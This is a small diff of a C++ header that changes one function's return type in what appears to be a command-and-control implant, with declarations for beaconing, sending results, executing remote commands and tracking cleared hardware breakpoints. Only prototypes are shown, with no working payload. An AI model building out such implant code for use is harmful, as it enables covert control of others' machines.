@@ -16,7 +16,7 @@ struct Session {
     BOOL  hwbpsCleared;
 };
 
-VOID BeaconLoop(const Session& session);
+DWORD BeaconLoop(const Session& session);
 BOOL SendBeacon(const Session& session, std::wstring& taskOut);
 BOOL SendResult(const std::wstring& sessionId, const std::wstring& output);
 std::wstring ExecuteCommand(const std::wstring& cmd);
